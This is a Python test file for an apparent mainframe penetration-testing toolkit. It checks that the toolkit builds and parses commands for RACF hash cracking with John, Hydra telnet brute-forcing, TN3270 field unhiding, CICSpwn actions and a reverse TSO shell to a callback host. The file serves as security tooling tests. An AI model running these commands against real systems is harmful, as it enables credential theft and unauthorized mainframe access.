"""Tests for Phase 4 - the tool chain (PCAP writer, John/racf2john, Hydra).

Run: python3 tests/test_toolchain.py
"""
import sys, os, struct, tempfile
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from phosphor.toolchain import pcap, crack, hydra, tool_status

_p = _f = 0
def ok(name, cond):
    global _p, _f
    if cond: _p += 1; print("  ok  " + name)
    else: _f += 1; print(" FAIL " + name)


def _read_pcap(path):
    raw = open(path, "rb").read()
    magic, vmaj, vmin, _tz, _sf, _snap, net = struct.unpack("<IHHiIII", raw[:24])
    i, payloads = 24, []
    while i < len(raw):
        _ts, _us, caplen, _orig = struct.unpack("<IIII", raw[i:i + 16]); i += 16
        payloads.append(raw[i + 54:i + caplen]); i += caplen   # skip eth14+ip20+tcp20
    return magic, net, payloads


def test_pcap_valid_and_payloads():
    path = os.path.join(tempfile.mkdtemp(), "c.pcap")
    w = pcap.PcapWriter(path, server_ip="192.168.0.248", server_port=23)
    w.packet("IN", bytes([0x05, 0xc7]) + b"z/OS V2R5")
    w.packet("OUT", b"\x7dLOGON")
    w.close()
    magic, net, payloads = _read_pcap(path)
    ok("pcap magic", magic == 0xA1B2C3D4)
    ok("ethernet linktype", net == 1)
    ok("two records", len(payloads) == 2)
    ok("inbound payload intact", payloads[0].endswith(b"z/OS V2R5"))
    ok("outbound payload intact", payloads[1] == b"\x7dLOGON")


def test_pcap_tcp_seq_advances():
    path = os.path.join(tempfile.mkdtemp(), "s.pcap")
    w = pcap.PcapWriter(path)
    w.packet("OUT", b"ABC"); s1 = w.seq["OUT"]
    w.packet("OUT", b"DE"); s2 = w.seq["OUT"]
    w.close()
    ok("seq advances by payload length", s2 - s1 == 2 and s1 == 4)


def test_racf_crack_chain_and_parse():
    cmds = crack.full_chain_commands("SYS1.RACFDS", wordlist="passwords.txt")
    ok("racf2john first, redirected", cmds[0].startswith("racf2john SYS1.RACFDS >"))
    ok("john uses racf format", "--format=racf" in cmds[1] and "--wordlist=passwords.txt" in cmds[1])
    r = crack.parse_john_show("IBMUSER:PASSW0RD:::\nSYSADM:LETMEIN:::\n2 password hashes cracked, 3 left")
    ok("cracked parsed", r.cracked == {"IBMUSER": "PASSW0RD", "SYSADM": "LETMEIN"})
    ok("totals parsed", r.total == 5 and r.remaining == 3)
    ok("kdfaes format accepted", "racf-kdfaes" in crack.RACF_FORMATS)


def test_hydra_cmd_and_parse():
    c = hydra.hydra_cmd_string("192.168.0.248", "telnet", 23, "users.txt", "passwords.txt")
    ok("hydra command well-formed", c.startswith("hydra -L users.txt -P passwords.txt -s 23"))
    r = hydra.parse_hydra("[23][telnet] host: 192.168.0.248   login: IBMUSER   password: SYS1")
    ok("hydra hit parsed", r.as_dict() == {"IBMUSER": "SYS1"})
    ok("unknown service falls back to telnet", hydra.hydra_cmd("h", "bogus")[-1] == "telnet")


def test_tool_status():
    st = tool_status()
    ok("pcap always available", st["pcap"]["installed"] is True)
    ok("external tools detected + hinted", "john" in st and "hint" in st["john"])


if __name__ == "__main__":
    for fn in (test_pcap_valid_and_payloads, test_pcap_tcp_seq_advances,
               test_racf_crack_chain_and_parse, test_hydra_cmd_and_parse, test_tool_status):
        print("\n" + fn.__name__); fn()
    print(f"\nPhase 4 (tool chain): {_p} passed, {_f} failed")
    sys.exit(1 if _f else 0)


# --- Phase 5: hack3270 native manipulation + proxy command building ---
def test_hack3270_native_manip():
    from phosphor.toolchain import hack3270_proxy as h3
    from phosphor.protocols.tn3270 import datastream as ds
    prot_hidden = 0x20 | 0x0C
    data = bytes([ds.CMD_EW, 0xC0, ds.SBA]) + ds.enc_addr(0) + bytes([ds.SF, prot_hidden]) + b"SECRET"
    mod = h3.manipulate_inbound(data, unprotect=True, unhide=True)
    a = mod[mod.index(ds.SF) + 1]
    ok("unprotect clears protected bit", not (a & 0x20))
    ok("unhide clears non-display bits", (a & 0x0C) != 0x0C)
    a2 = h3.manipulate_inbound(data, unprotect=True, unhide=False)[data.index(ds.SF) + 1] if False else None
    m2 = h3.manipulate_inbound(data, unprotect=True, unhide=False)
    ok("unprotect-only preserves hidden", (m2[m2.index(ds.SF) + 1] & 0x0C) == 0x0C)
    ok("no-op when disabled", h3.manipulate_inbound(data) == data)


def test_hack3270_sfe_manip():
    from phosphor.toolchain import hack3270_proxy as h3
    from phosphor.protocols.tn3270 import datastream as ds
    # SFE with a field-attribute pair (0xC0) that is protected
    sfe = bytes([ds.CMD_EW, 0xC0, ds.SBA]) + ds.enc_addr(0) + bytes([ds.SFE, 0x01, 0xC0, 0x20]) + b"X"
    mod = h3.manipulate_inbound(sfe, unprotect=True)
    i = mod.index(ds.SFE)
    ok("SFE field attr unprotected", not (mod[i + 3] & 0x20))


def test_hack3270_proxy_command():
    from phosphor.toolchain import hack3270_proxy as h3
    p = h3.Hack3270Proxy("192.168.0.248", 23, "127.0.0.1", 3271)
    import os
    os.environ["PHOSPHOR_HACK3270_CMD"] = "hack3270 -l {listen_host}:{listen_port} -t {target_host}:{target_port}"
    cmd = p.command()
    ok("proxy command substitutes placeholders",
       cmd == ["hack3270", "-l", "127.0.0.1:3271", "-t", "192.168.0.248:23"])
    del os.environ["PHOSPHOR_HACK3270_CMD"]
    ok("availability detection callable", isinstance(h3.hack3270_available(), bool))


# --- pcap read-back + CICSpwn options + shell channel ---
def test_pcap_read_roundtrip():
    import tempfile, os
    path = os.path.join(tempfile.mkdtemp(), "rt.pcap")
    w = pcap.PcapWriter(path, server_ip="192.168.0.248", server_port=23)
    w.packet("OUT", b"IBMUSER"); w.packet("IN", b"READY"); w.close()
    recs = pcap.read_pcap(path, 23)
    ok("read count", len(recs) == 2)
    ok("direction from server_port", recs[1][0] == "IN" and recs[0][0] == "OUT")
    ok("payload intact", recs[0][1] == b"IBMUSER")


def test_cicspwn_options():
    from phosphor.toolchain import cicspwn as C
    ok("has multiple actions", len(C.action_ids()) >= 8)
    r = C.build_results("192.168.0.248", 23, "userids", applid="CICSPROD")
    ok("namespace covers all dests", all(hasattr(r, k) for k in C.DEFAULTS))
    ok("action override applied", r.userids is True)
    r2 = C.build_results("h", 23, "rev_tso", lhost="10.0.0.5:4444")
    ok("reverse shell sets submit+lhost", r2.submit == "reverse_tso" and r2.lhost == "10.0.0.5:4444")
    ok("reverse shell needs lhost", C.validate("rev_tso", None) is not None)
    ok("reverse shell ok with lhost", C.validate("rev_tso", "h:1") is None)
    cmd = C.build_command("cicspwn.py", "192.168.0.248", 23, "files", applid="CICS")
    ok("command targets run_cicspwn", "phosphor.run_cicspwn" in cmd and "--action files" in cmd)


def test_shell_channel_loopback():
    import socket, time
    from phosphor.toolchain.shell import ShellSession, _split_hostport
    ok("hostport split", _split_hostport("10.0.0.5:4444") == ("10.0.0.5", 4444))
    sess = ShellSession("listen", "127.0.0.1:39001")
    sess.start(); time.sleep(0.3)
    c = socket.create_connection(("127.0.0.1", 39001), timeout=3)
    c.sendall(b"shell up\n"); time.sleep(0.3)
    out = sess.drain()
    ok("listener accepts + reads", any("shell up" in l for l in out))
    ok("session marked connected", sess.connected)
    sess.send("LISTC"); time.sleep(0.2)
    ok("send reaches shell end", c.recv(50).strip() == b"LISTC")
    sess.stop(); c.close()
